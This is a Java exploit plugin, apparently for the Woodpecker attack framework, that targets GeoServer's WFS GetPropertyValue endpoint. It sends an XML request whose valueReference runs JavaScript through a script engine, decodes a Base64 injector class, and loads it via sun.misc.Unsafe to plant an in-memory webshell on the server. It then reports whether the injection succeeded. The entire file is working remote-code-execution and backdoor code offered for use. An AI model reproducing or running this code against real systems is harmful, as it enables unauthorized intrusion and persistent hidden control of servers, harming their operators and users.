package plugins.vul.geoserver;

import jmg.core.config.AbstractConfig;
import jmg.core.config.Constants;
import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.Header;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.tools.misc.RandomUtil;
import util.MemShellUtil;
import util.jmg.ResultUtil;

import java.util.Base64;
import java.util.List;
import java.util.Map;

public class Inject_MemShell_Exploit implements IExploit {
    private IPluginHelper helper;

    public Inject_MemShell_Exploit() {
        helper = GeoServer_GetPropertyValue_Plugin.pluginHelper;
    }

    @Override
    public String getExploitTabCaption() {
        return "内存马注入";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder usageBinder = helper.createArgsUsageBinder();
        List<IArg> args = MemShellUtil.generateMemShellArgs(helper);

        // GeoServer默认设置为Jetty
        args.get(1).setDefaultValue(Constants.SERVER_JETTY);
        // https://yzddmr6.com/posts/geoserver-memoryshell/,包名跟第一个参数Class的包名一致
        IArg injectorClassName = args.get(6);
        injectorClassName.setRequired(true);
        injectorClassName.setDefaultValue("java.lang."+ RandomUtil.getRandomString(5));
        injectorClassName.setDescription("注入器类名,需要在java.lang包下");
        usageBinder.setArgsList(args);
        return usageBinder;
    }

    @Override
    public void doExploit(ITarget iTarget, Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        AbstractConfig config = MemShellUtil.initShellConfig(map);
        byte[] data = config.getInjectorBytes();
        String target = iTarget.getAddress() + "/geoserver/wfs";
        String body = String.format("<wfs:GetPropertyValue service='WFS' version='2.0.0'\n" +
                " xmlns:topp='http://www.openplans.org/topp'\n" +
                " xmlns:fes='http://www.opengis.net/fes/2.0'\n" +
                " xmlns:wfs='http://www.opengis.net/wfs/2.0'>\n" +
                "  <wfs:Query typeNames='sf:archsites'/>\n" +
                "  <wfs:valueReference>eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'\n" +
                "var str=\"%s\";\n" +
                "var bt;\n" +
                "try {\n" +
                "    bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);\n" +
                "} catch (e) {\n" +
                "    bt = java.util.Base64.getDecoder().decode(str);\n" +
                "}\n" +
                "var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n" +
                "theUnsafe.setAccessible(true);\n" +
                "unsafe = theUnsafe.get(null);\n" +
                "unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), bt, null).newInstance();\n" +
                "')</wfs:valueReference>\n" +
                "</wfs:GetPropertyValue>\n", Base64.getEncoder().encodeToString(data));
        RawResponse response = Requests.post(target)
                .headers(
                        new Header("Content-Type","application/xml"))
                .body(body)
                .send();
        String resp = response.readToText();
        if (resp.contains("java.lang.ClassCastException: ")){
            iResultOutput.successPrintln("内存马注入成功");
            ResultUtil.resultOutput(config,iResultOutput);
        } else {
            iResultOutput.failPrintln("内存马注入失败");
        }

    }
}
